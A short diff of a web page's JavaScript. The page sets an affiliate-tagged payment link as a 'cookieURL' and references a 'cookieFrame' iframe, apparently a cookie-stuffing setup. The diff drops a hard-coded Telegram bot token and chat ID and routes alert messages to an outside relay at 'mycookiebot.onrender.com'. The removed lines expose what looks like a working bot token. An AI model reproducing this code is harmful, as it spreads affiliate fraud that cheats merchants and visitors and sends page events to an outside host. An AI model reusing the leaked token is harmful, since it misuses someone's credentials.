@@ -72,17 +72,13 @@
     const cookieURL = "https://pay.kirvano.com/f51e5154-5b66-4e61-aee5-078fbb594c05?aff=45ed4346-4342-40c7-8445-e73c52814cac";
     const checkoutURL = "https://wa.me/message/VDDSYCLTLNOQE1";
 
-    const NumeroTLG = '7674575961:AAGSl6HVhZJhymoedLgBMESc9rPF88Q98Es';
-    const CanalTLG = '5493027377';
-
     function enviarAlerta(msg) {
-      const url = `https://api.telegram.org/bot${NumeroTLG}/sendMessage`;
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CanalTLG, text: msg })
-      }).catch(console.error);
-    }
+		fetch("https://mycookiebot.onrender.com/send", {
+		method: 'POST',
+		headers: { 'Content-Type': 'application/json' },
+		body: JSON.stringify({ text: msg })
+		}).catch(console.error);
+	}
 
     const msg = document.getElementById("message");
     const iframe = document.getElementById("cookieFrame");
